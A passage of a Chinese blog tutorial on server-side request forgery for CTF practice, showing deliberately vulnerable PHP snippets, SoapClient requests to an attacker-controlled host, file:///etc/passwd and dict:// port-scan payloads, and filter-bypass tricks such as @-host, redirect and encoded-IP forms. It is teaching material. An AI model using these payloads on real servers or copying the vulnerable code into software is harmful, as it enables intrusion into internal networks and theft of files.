fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"cdn":{"enable":true,"provider":"jsdelivr"}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201984.jpeg\"\n                        alt=\"SSRF\"\n                 ></p>\n<blockquote>\n<p>FreeBuf停更好久，我都忘了自己还有一个FreeBuf账号了，嘿嘿，你们信吗？</p>\n</blockquote>\n<p>在最近一段时间的CTF中，感觉SSRF的题型又多了起来。SSRF这个漏洞也是我自己最喜欢的一个漏洞了，趁寒假没事干，便写了这篇文章总结一下SSRF的几种利用方式。本文多为笔者的学习总结，内容十分详细且丰富，大佬路过还望多多点评。</p>\n<h2 id=\"漏洞详情\"><a href=\"#漏洞详情\" class=\"headerlink\" title=\"漏洞详情\"></a>漏洞详情</h2><p>SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。</p>\n<p>SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。</p>\n<p>如下图所示，服务器Ubuntu为WEB服务器，可被攻击者访问，内网中的其他服务器无法被攻击者直接访问。假设服务器Ubuntu中的某个WEB应用存在SSRF漏洞，那我们就可以操作这个WEB服务器去读取本地的文件、探测内网主机存活、探测内网主机端口等，如果借助相关网络协议，我们还可以攻击内网中的Redis、MySql、FastCGI等应用，WEB服务器在整个攻击过程中被作为中间人进行利用。<img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610597995_5fffc66bd4875385a330e.png!small\"\n                        alt=\"image-20210112220229389\"\n                 ></p>\n<p><strong>容易出现SSRF的地方有：</strong></p>\n<blockquote>\n<ol>\n<li><p>社交分享功能：获取超链接的标题等内容进行显示</p>\n</li>\n<li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>\n</li>\n<li><p>在线翻译：给网址翻译对应网页的内容</p>\n</li>\n<li><p>图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片</p>\n</li>\n<li><p>图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>\n</li>\n<li><p>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>\n</li>\n<li><p>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>\n</li>\n<li><p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>\n</li>\n<li><p>邮件系统：比如接收邮件服务器地址</p>\n</li>\n<li><p>编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>\n</li>\n<li><p>未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>\n</li>\n<li><p>从远程服务器请求资源</p>\n</li>\n</ol>\n</blockquote>\n<p><strong>SSRF漏洞的危害：</strong></p>\n<blockquote>\n<ol>\n<li><p>对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。</p>\n</li>\n<li><p>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。</p>\n</li>\n<li><p>对内网Web应用进行指纹识别，识别企业内部的资产信息。</p>\n</li>\n<li><p>攻击内外网的Web应用，主要是使用HTTP GET&#x2F;POST请求就可以实现的攻击，如sql注入、文件上传等。</p>\n</li>\n<li><p>利用file协议读取服务器本地文件等。</p>\n</li>\n<li><p>进行跳板攻击等。</p>\n</li>\n</ol>\n</blockquote>\n<h2 id=\"SSRF漏洞相关函数和类\"><a href=\"#SSRF漏洞相关函数和类\" class=\"headerlink\" title=\"SSRF漏洞相关函数和类\"></a>SSRF漏洞相关函数和类</h2><ul>\n<li><p>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</p>\n</li>\n<li><p>readfile()：输出一个文件的内容。</p>\n</li>\n<li><p>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</p>\n</li>\n<li><p>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p>\n</li>\n<li><p>fopen()：打开一个文件文件或者 URL。</p>\n</li>\n<li><p>……</p>\n</li>\n</ul>\n<p>上述函数函数使用不当会造成SSRF漏洞。 此外，PHP原生类SoapClient在触发反序列化时可导致SSRF。</p>\n<h3 id=\"file-get-contents\"><a href=\"#file-get-contents\" class=\"headerlink\" title=\"file_get_contents()\"></a>file_get_contents()</h3><p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$url = $\\_GET\\[&#x27;url&#x27;\\];;</span><br><span class=\"line\">echo file\\_get\\_contents($url);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上述测试代码中，file_get_contents() 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似<code>ssrf.php?url=../../../../../etc/passwd</code>的paylaod即可读取服务器本地的任意文件。</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610597996_5fffc66c9d8087b2c3242.png!small\"\n                        alt=\"image-20210112225820457\"\n                 ></p>\n<p>readfile()函数与file_get_contents()函数相似。</p>\n<h3 id=\"fsockopen\"><a href=\"#fsockopen\" class=\"headerlink\" title=\"fsockopen()\"></a>fsockopen()</h3><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。 fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$host=$\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">$fp = fsockopen($host, 80, $errno, $errstr, 30);</span><br><span class=\"line\">if (!$fp) &#123;</span><br><span class=\"line\">    echo &quot;$errstr ($errno)&lt;br /&gt;\\\\n&quot;;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    $out = &quot;GET / HTTP/1.1\\\\r\\\\n&quot;;</span><br><span class=\"line\">    $out .= &quot;Host: $host\\\\r\\\\n&quot;;</span><br><span class=\"line\">    $out .= &quot;Connection: Close\\\\r\\\\n\\\\r\\\\n&quot;;</span><br><span class=\"line\">    fwrite($fp, $out);</span><br><span class=\"line\">    while (!feof($fp)) &#123;</span><br><span class=\"line\">        echo fgets($fp, 128);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fclose($fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>构造<code>ssrf.php?url=www.baidu.com</code>即可成功触发ssrf并返回百度主页：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201642.jpeg\"\n                        alt=\"image-20210112230552313\"\n                 ></p>\n<h3 id=\"curl-exec\"><a href=\"#curl-exec\" class=\"headerlink\" title=\"curl_exec()\"></a>curl_exec()</h3><p>curl_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">if (isset($\\_GET\\[&#x27;url&#x27;\\]))&#123;</span><br><span class=\"line\">\t$link = $\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">\t$curlobj = curl\\_init(); // 创建新的 cURL 资源</span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); // 设置 URL 和相应的选项</span><br><span class=\"line\">\t$result=curl\\_exec($curlobj); // 抓取 URL 并把它传递给浏览器</span><br><span class=\"line\">\tcurl\\_close($curlobj); // 关闭 cURL 资源，并且释放系统资源</span><br></pre></td></tr></table></figure>\n\n\n\n<pre><code>// $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;\n// file\\_put\\_contents($filename, $result); \necho $result;\n</code></pre>\n<p>}<br>?&gt;</p>\n<p>构造<code>ssrf.php?url=www.baidu.com</code>即可成功触发ssrf并返回百度主页：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201758.jpeg\"\n                        alt=\"image-20210112231108247\"\n                 ></p>\n<h3 id=\"SoapClient\"><a href=\"#SoapClient\" class=\"headerlink\" title=\"SoapClient\"></a>SoapClient</h3><p>SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。</p>\n<p>SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的<code>__call</code>方法，那么<code>__call</code>便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：</p>\n<p>public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</p>\n<ul>\n<li><p>第一个参数是用来指明是否是wsdl模式。</p>\n</li>\n<li><p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。</p>\n</li>\n</ul>\n<p>知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数为一个包含location和uri的数组，location选项的值设置为target_url：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333&#x27;, &#x27;location&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;));  </span><br><span class=\"line\">$b = serialize($a);  </span><br><span class=\"line\">echo $b;  </span><br><span class=\"line\">$c = unserialize($b);  </span><br><span class=\"line\">$c-&gt;a();    // 随便调用对象中不存在的方法, 触发\\_\\_call方法进行ssrf  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>47.xxx.xxx.72监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610597999_5fffc66f758c21c129c42.png!small\"\n                        alt=\"image-20210112234821125\"\n                 ></p>\n<p>如上图所示，ssrf触发成功。</p>\n<p>由于它仅限于http&#x2F;https协议，所以用处不是很大。但是如果这里的http头部还存在crlf漏洞，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头，详情请看：<a class=\"link\"   href=\"https://www.anquanke.com/post/id/202025\" >《SoapClient+crlf组合拳进行SSRF》<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"SSRF漏洞利用的相关协议\"><a href=\"#SSRF漏洞利用的相关协议\" class=\"headerlink\" title=\"SSRF漏洞利用的相关协议\"></a>SSRF漏洞利用的相关协议</h3><p>SSRF漏洞的利用所涉及的协议有：</p>\n<ul>\n<li><p>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</p>\n</li>\n<li><p>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p>\n</li>\n<li><p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p>\n</li>\n<li><p>http&#x2F;s协议：探测内网主机存活</p>\n</li>\n</ul>\n<p>下面我们对这些协议的利用进行逐一演示。</p>\n<h2 id=\"常见利用方式（file、http-s和dict协议）\"><a href=\"#常见利用方式（file、http-s和dict协议）\" class=\"headerlink\" title=\"常见利用方式（file、http&#x2F;s和dict协议）\"></a>常见利用方式（file、http&#x2F;s和dict协议）</h2><p>SSRF的利用主要就是读取内网文件、探测内网主机存活、扫描内网端口、攻击内网其他应用等，而这些利用的手法无一不与这些协议息息相关。</p>\n<p>以下几个演示所用的测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">if (isset($\\_GET\\[&#x27;url&#x27;\\]))&#123;</span><br><span class=\"line\">\t$link = $\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">\t$curlobj = curl\\_init(); // 创建新的 cURL 资源</span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); // 设置 URL 和相应的选项</span><br><span class=\"line\">\t$result=curl\\_exec($curlobj); // 抓取 URL 并把它传递给浏览器</span><br><span class=\"line\">\tcurl\\_close($curlobj); // 关闭 cURL 资源，并且释放系统资源</span><br></pre></td></tr></table></figure>\n\n\n\n<pre><code>// $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;\n// file\\_put\\_contents($filename, $result); \necho $result;\n</code></pre>\n<p>}<br>?&gt;</p>\n<h3 id=\"读取内网文件（file协议）\"><a href=\"#读取内网文件（file协议）\" class=\"headerlink\" title=\"读取内网文件（file协议）\"></a>读取内网文件（file协议）</h3><p>我们构造如下payload，即可将服务器上的本地文件及网站源码读取出来：</p>\n<p>ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598000_5fffc670560e2d6fed29c.png!small\"\n                        alt=\"image-20210113000529370\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201861.jpeg\"\n                        alt=\"image-20210113000640979\"\n                 ></p>\n<h3 id=\"探测内网主机存活（http-s协议）\"><a href=\"#探测内网主机存活（http-s协议）\" class=\"headerlink\" title=\"探测内网主机存活（http&#x2F;s协议）\"></a>探测内网主机存活（http&#x2F;s协议）</h3><p>一般是先想办法得到目标主机的网络配置信息，如读取&#x2F;etc&#x2F;hosts、&#x2F;proc&#x2F;net&#x2F;arp、&#x2F;proc&#x2F;net&#x2F;fib_trie等文件，从而获得目标主机的内网网段并进行爆破。</p>\n<p>域网IP地址范围分三类，以下IP段为内网IP段：</p>\n<ul>\n<li><p>C类：192.168.0.0 - 192.168.255.255</p>\n</li>\n<li><p>B类：172.16.0.0 - 172.31.255.255</p>\n</li>\n<li><p>A类：10.0.0.0 - 10.255.255.255</p>\n</li>\n</ul>\n<p>测试环境如下：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201380.jpeg\"\n                        alt=\"image-20210113190506825\"\n                 ></p>\n<p>假设WEB服务器Ubuntu上面存在上述所说的SSRF漏洞，我们构造如下payload，便可通过Ubuntu服务器发送请求去探测内网存活的主机：</p>\n<p>ssrf.php?url&#x3D;<a class=\"link\"   href=\"http://192.168.52.1/\" >http://192.168.52.1<i class=\"fas fa-external-link-alt\"></i></a><br>ssrf.php?url&#x3D;<a class=\"link\"   href=\"http://192.168.52.6/\" >http://192.168.52.6<i class=\"fas fa-external-link-alt\"></i></a><br>ssrf.php?url&#x3D;<a class=\"link\"   href=\"http://192.168.52.25/\" >http://192.168.52.25<i class=\"fas fa-external-link-alt\"></i></a><br>……</p>\n<p>为了方便，我们可以借助burpsuite的Intruder模块进行爆破，如下所示：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598003_5fffc67301c9d222a58c6.png!small\"\n                        alt=\"image-20210113120505690\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201508.jpeg\"\n                        alt=\"image-20210113120551977\"\n                 ></p>\n<p>将爆破的线程尽可能设的小一些。开始爆破后即可探测到目标内网中存在如下两个存活的主机（192.168.52.130和192.168.52.131）：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598005_5fffc6750b23dd040c364.png!small\"\n                        alt=\"image-20210113120806794\"\n                 ></p>\n<h3 id=\"扫描内网端口（http-s和dict协议）\"><a href=\"#扫描内网端口（http-s和dict协议）\" class=\"headerlink\" title=\"扫描内网端口（http&#x2F;s和dict协议）\"></a>扫描内网端口（http&#x2F;s和dict协议）</h3><p>同样是上面那个测试环境：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598006_5fffc67625206702cdd18.png!small\"\n                        alt=\"image-20210113190455756\"\n                 ></p>\n<p>我们利用dict协议构造如下payload即可查看内网主机上开放的端口及端口上运行服务的版本信息等：</p>\n<p>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.131:6379&#x2F;info   &#x2F;&#x2F; redis<br>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.131:80&#x2F;info     &#x2F;&#x2F; http<br>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.130:22&#x2F;info   &#x2F;&#x2F; ssh</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201787.jpeg\"\n                        alt=\"image-20210113190244954\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201476.jpeg\"\n                        alt=\"image-20210113122530377\"\n                 ></p>\n<p>同样可以借助burpsuite来爆破内网主机上的服务。</p>\n<h2 id=\"相关绕过姿势\"><a href=\"#相关绕过姿势\" class=\"headerlink\" title=\"相关绕过姿势\"></a>相关绕过姿势</h2><p>对于SSRF的限制大致有如下几种：</p>\n<ul>\n<li><p>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</p>\n</li>\n<li><p>限制域名只能为<a class=\"link\"   href=\"http://www.xxx.com/\" >http://www.xxx.com<i class=\"fas fa-external-link-alt\"></i></a></p>\n</li>\n<li><p>限制不能访问内网的IP，以防止对内网进行攻击。</p>\n</li>\n<li><p>屏蔽返回的详细信息。</p>\n</li>\n</ul>\n<h3 id=\"利用HTTP基本身份认证的方式绕过\"><a href=\"#利用HTTP基本身份认证的方式绕过\" class=\"headerlink\" title=\"利用HTTP基本身份认证的方式绕过\"></a>利用HTTP基本身份认证的方式绕过</h3><p>如果目标代码限制访问的域名只能为 <a class=\"link\"   href=\"http://www.xxx.com/\" >http://www.xxx.com<i class=\"fas fa-external-link-alt\"></i></a>，那么我们可以采用HTTP基本身份认证的方式绕过。即@：<a class=\"link\"   href=\"http://www.evil.com/\" >http:&#x2F;&#x2F;www.xxx.com@www.evil.com<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"利用302跳转绕过内网IP\"><a href=\"#利用302跳转绕过内网IP\" class=\"headerlink\" title=\"利用302跳转绕过内网IP\"></a>利用302跳转绕过内网IP</h3><p>绕过对内网ip的限制我们可以<strong>利用302跳转</strong>的方法，有以下两种。</p>\n<p>（1）网络上存在一个很神奇的服务，网址为 <a class=\"link\"   href=\"http://xip.io/\" >http://xip.io<i class=\"fas fa-external-link-alt\"></i></a>，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</p>\n<p>当我们访问：<a class=\"link\"   href=\"http://127.0.0.1.xip.io/flag.php\" >http://127.0.0.1.xip.io/flag.php<i class=\"fas fa-external-link-alt\"></i></a>时，实际访问的是<a class=\"link\"   href=\"http://127.0.0.1/1.php\" >http://127.0.0.1/1.php<i class=\"fas fa-external-link-alt\"></i></a>。像这种网址还有<a class=\"link\"   href=\"http://nip.io/\" >http://nip.io<i class=\"fas fa-external-link-alt\"></i></a>，<a class=\"link\"   href=\"http://sslip.io/\" >http://sslip.io<i class=\"fas fa-external-link-alt\"></i></a>。</p>\n<p>如下示例（flag.php仅能从本地访问）：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598008_5fffc67858617e4b20974.png!small\"\n                        alt=\"image-20210113124813254\"\n                 ></p>\n<p>（2）短地址跳转绕过，这里也给出一个网址 <a class=\"link\"   href=\"https://4m.cn/\" >https://4m.cn/<i class=\"fas fa-external-link-alt\"></i></a>：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201164.jpeg\"\n                        alt=\"image-20201027163528110\"\n                 ></p>\n<p>直接使用生成的短连接 <a class=\"link\"   href=\"https://4m.cn/FjOdQ\" >https://4m.cn/FjOdQ<i class=\"fas fa-external-link-alt\"></i></a>就会自动302跳转到 <a class=\"link\"   href=\"http://127.0.0.1/flag.php\" >http://127.0.0.1/flag.php<i class=\"fas fa-external-link-alt\"></i></a>上，这样就可以绕过WAF了：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598010_5fffc67a644209d507f01.png!small\"\n                        alt=\"image-20210113124727560\"\n                 ></p>\n<h3 id=\"进制的转换绕过内网IP\"><a href=\"#进制的转换绕过内网IP\" class=\"headerlink\" title=\"进制的转换绕过内网IP\"></a>进制的转换绕过内网IP</h3><p>可以使用一些不同的进制替代ip地址，从而绕过WAF，这里给出个从网上扒的php脚本可以一键转换：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$ip = &#x27;127.0.0.1&#x27;;  </span><br><span class=\"line\">$ip = explode(&#x27;.&#x27;,$ip);  </span><br><span class=\"line\">$r = ($ip\\[0\\] &lt;&lt; 24) | ($ip\\[1\\] &lt;&lt; 16) | ($ip\\[2\\] &lt;&lt; 8) | $ip\\[3\\] ;  </span><br><span class=\"line\">if($r &lt; 0) &#123;  </span><br><span class=\"line\">$r += 4294967296;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">echo &quot;十进制:&quot;;     // 2130706433  </span><br><span class=\"line\">echo $r;  </span><br><span class=\"line\">echo &quot;八进制:&quot;;     // 0177.0.0.1  </span><br><span class=\"line\">echo decoct($r);  </span><br><span class=\"line\">echo &quot;十六进制:&quot;;   // 0x7f.0.0.1  </span><br><span class=\"line\">echo dechex($r);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"其他各种指向127-0-0-1的地址\"><a href=\"#其他各种指向127-0-0-1的地址\" class=\"headerlink\" title=\"其他各种指向127.0.0.1的地址\"></a>其他各种指向127.0.0.1的地址</h3><p><a class=\"link\"   href=\"http://localhost/\" >http://localhost/<i class=\"fas fa-external-link-alt\"></i></a>         # localhost就是代指127.0.0.1<br><a class=\"link\"   href=\"http://0.0.0.0/\" >http://0/<i class=\"fas fa-external-link-alt\"></i></a>                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1<br>http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;    # 在liunx下可用，window测试了下不行<br>http:&#x2F;&#x2F;[::]:80&#x2F;           # 在liunx下可用，window测试了下不行<br><a class=\"link\"   href=\"http://127.0.0.1/\" >http://127。0。0。1/<i class=\"fas fa-external-link-alt\"></i></a>       # 用中文句号绕过<br>http:&#x2F;&#x2F;①②⑦.⓪.⓪.①<br><a class=\"link\"   href=\"http://127.0.0.1/\" >http://127.1/<i class=\"fas fa-external-link-alt\"></i></a><br><a class=\"link\"   href=\"http://127.0.0.1/\" >http://127.00000.00000.001/<i class=\"fas fa-external-link-alt\"></i></a> # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</p>\n<h3 id=\"利用不存在的协议头绕过指定的协议头\"><a href=\"#利用不存在的协议头绕过指定的协议头\" class=\"headerlink\" title=\"利用不存在的协议头绕过指定的协议头\"></a>利用不存在的协议头绕过指定的协议头</h3><p><code>file_get_contents()</code>函数的一个特性，即当PHP的<code>file_get_contents()</code>函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）</p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">highlight\\_file(\\_\\_FILE\\_\\_);  </span><br><span class=\"line\">if(!preg\\_match(&#x27;/^https/is&#x27;,$\\_GET\\[&#x27;url&#x27;\\]))&#123;  </span><br><span class=\"line\">die(&quot;no hack&quot;);  </span><br><span class=\"line\">&#125;  </span><br><span 